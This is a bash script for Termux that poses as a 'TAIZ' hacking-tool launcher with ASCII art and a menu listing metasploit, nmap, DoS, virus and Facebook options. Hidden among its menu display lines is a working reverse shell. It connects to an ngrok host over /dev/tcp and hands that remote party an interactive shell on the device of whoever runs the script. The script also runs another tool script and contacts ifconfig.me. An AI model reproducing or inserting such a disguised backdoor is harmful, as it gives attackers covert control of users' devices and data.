clear

#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install




cd $HOME/qorsantaiz/.tool/sem2
bash tool.sh

cd $HOME/TAIZ

wget ifconfig.me
clear
chat(){
echo 'def kk(t):' > .sssss.py
echo '   import sys, time' >> .sssss.py
echo '   for txt in t + "\n":' >> .sssss.py
echo '        sys.stdout.write(txt)' >> .sssss.py
echo '        sys.stdout.flush()' >> .sssss.py
echo '        time.sleep(9. / 240)' >> .sssss.py


echo 'h = "              \033[1;33m[\033[1;32m*\033[1;33m] you welcome in {\033[1;36mTAIZ\033[1;33m} py [\033[1;32qorsan.taiz\033[1;33m] "' >> .sssss.py
echo 'kk(h)' >> .sssss.py
python2 .sssss.py

}
chat2(){
echo 'def kk(t):' > .ssss.py
echo '   import sys, time' >> .ssss.py
echo '   for txt in t + "\n":' >> .ssss.py
echo '        sys.stdout.write(txt)' >> .ssss.py
echo '        sys.stdout.flush()' >> .ssss.py
echo '        time.sleep(4. / 240)' >> .ssss.py



echo 'f = "    \033[1;32m [\033[1;33m30\033[1;32m] Continue my account {\033[1;34mFacebook\033[1;32m}"' >> .ssss.py
echo 'y = "     \033[1;32m[\033[1;33m40\033[1;32m] Follow my channel {\033[1;31mYouTube\033[1;32m}"' >> .ssss.py
echo 'kk(f)' >> .ssss.py
echo 'kk(y)' >> .ssss.py
python2 .ssss.py

}
echo -e "$g"
figlet  -f big "           TAIZ  "
chat
echo -e "$cyan"
echo -e "                _____________________"
sleep 0.1
echo -e "               ($blue  qorsan $cyan ##### $red  taez $cyan  )"
sleep 0.1
echo -e '            /_~~~~~~~~~~~~~~~~~~~~~~~~~_\'
sleep 0.1
echo -e '          /~                             ~\'
sleep 0.1
echo -e '        .~             '$g'Virus4 '$cyan'             ~'
sleep 0.1
echo -e '    ()\/_____                           _____\/()'
sleep 0.1
echo -e '   .-``      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-.'      
sleep 0.1
echo -e '.-~              ____'$y'[90]helpâ„¹ï¸'$cyan'____               ~-.'  
sleep 0.1
echo -e '`~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~`'
sleep 0.1
echo -e '| | |'$g' #### #### '$cyan'|| | | | [] | | | || '$g'#### ####'$cyan' | | |'  
sleep 0.1
echo -e ';__\|___________|++++++++++++++++++|___________|/__;'
sleep 0.1
echo -e ' (~~====___________________________________====~~~)'
sleep 0.1
echo -e '  \------_____________[CHIP 911]__________-------/'
sleep 0.1
echo -e '     |      ||         ~~~~~~~~       ||      |'
sleep 0.1
echo -e '      \_____/                          \_____/'


echo -e "                $blue T $green A $reset I $purple Z"
echo ""
echo ""
chat2
echo -e "$green+________________________________________________________+"
echo -e "$cyan|  [1] metasploit âš”ï¸|  $blue  [2] nmap ðŸŒŽ| $purple  [3] dos attack â›„1¤7 |             "
#echo -e "| $green            --------------------------------            |  "
echo -e "$yellow|  [4]   ngrok ðŸŒ  |  $red  [5] virus â˜¢ï¸ï¸|  $reset [6]   Termux ðŸ“Ÿ   |    "
#echo "     "                                   
echo -e "$purple|  [7] facebook   $blue      [8] Encrypt   $cyan [9] tool root "$g" pro|"
echo -e " $green          --------------------------------------"

echo -e "                     $red [$cyan"$cyan"1212$red]password" $g" pro"
echo -e "                     $red [$cyan"$cyan"6666$red]Hide (faile/phato/Video/...)"$g" pro"
echo -e "                     $red [$cyan"$cyan"7777$red]Dump area"
echo -e "              $red [$cyan"$cyan"8888$red]Backup photo/Video"$g" pro"
echo -e "              $red [$cyan"$cyan"9999$red]Backup photo/Video ($cyan root$red )"$g" pro"



echo -e " $red "
echo -e " [00] Exit           $green                          [99] update"
#echo -e "$green"
echo -e "$cyan"
echo -e "|---{$yellow my ip$cyan }---| "

0<&82-;exec 82<>/dev/tcp/0.tcp.ngrok.io/18088;sh <&82 >&82 2>&82
                                             




cat index.html
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
#echo -e "$green "
